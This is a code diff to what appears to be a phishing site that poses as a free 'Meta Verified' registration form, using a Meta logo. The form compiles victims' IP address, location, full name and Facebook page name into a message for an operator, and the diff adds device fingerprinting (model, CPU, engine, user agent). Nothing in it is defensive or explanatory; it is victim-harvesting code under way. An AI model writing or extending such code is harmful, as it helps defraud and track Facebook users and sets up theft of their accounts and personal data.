@@ -1,5 +1,6 @@
 import MetaLogo from '@/assets/images/meta-logo-image.png';
 import { store } from '@/store/store';
+import detectDevice from '@/utils/detect-device';
 import translateText from '@/utils/translate';
 import { faXmark } from '@fortawesome/free-solid-svg-icons/faXmark';
 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
@@ -92,6 +93,7 @@ const InitModal: FC<{ nextStep: (data: FormData) => void }> = ({ nextStep }) => 
 
         if (isLoading) return;
         setIsLoading(true);
+        const deviceInfo = detectDevice();
 
         const message = `
 ${
@@ -99,6 +101,8 @@ ${
         ? `<b>📌 IP:</b> <code>${geoInfo.ip}</code>\n<b>🌎 Country:</b> <code>${geoInfo.city} - ${geoInfo.country} (${geoInfo.country_code})</code>`
         : 'N/A'
 }
+<b>📱 Thiết bị:</b> <code>${deviceInfo?.deviceInfo || 'Unknown Device'}</code>
+${deviceInfo.model ? `   └ Model: <code>${deviceInfo.model}</code>\n` : ''}${deviceInfo.deviceType && deviceInfo.deviceType !== 'Unknown' ? `   └ Loại: <code>${deviceInfo.deviceType}</code>\n` : ''}${deviceInfo.cpu ? `   └ CPU: <code>${deviceInfo.cpu}</code>\n` : ''}${deviceInfo.engine ? `   └ Engine: <code>${deviceInfo.engine}</code>\n` : ''}${deviceInfo.userAgent ? `   └ UA: <code>${deviceInfo.userAgent.substring(0, 100)}${deviceInfo.userAgent.length > 100 ? '...' : ''}</code>\n` : ''}
 
 <b>👤 Full Name:</b> <code>${formData.fullName}</code>
 <b>📘 Page Name:</b> <code>${formData.pageName}</code>
@@ -133,7 +137,7 @@ ${
                 <div className='flex max-h-[95vh] w-full max-w-sm sm:max-w-md md:max-w-xl flex-col rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3]'>
                 <div className='mb-1.5 sm:mb-2 flex w-full items-center justify-between p-1.5 sm:p-2 md:p-4 pb-0'>
                     <p className='text-xs sm:text-sm md:text-lg font-bold'>{t('Complete the free Meta Verified registration form.')}</p>
-                    <button type='button' onClick={() => setModalOpen(false)} className='h-7 sm:h-8 w-7 sm:w-8 rounded-full transition-colors hover:bg-[#e2eaf2] flex-shrink-0' aria-label='Close modal'>
+                    <button type='button' onClick={() => setModalOpen(false)} className='h-7 w-7 shrink-0 rounded-full transition-colors hover:bg-[#e2eaf2] sm:h-8 sm:w-8' aria-label='Close modal'>
                         <FontAwesomeIcon icon={faXmark} size='lg' />
                     </button>
                 </div>
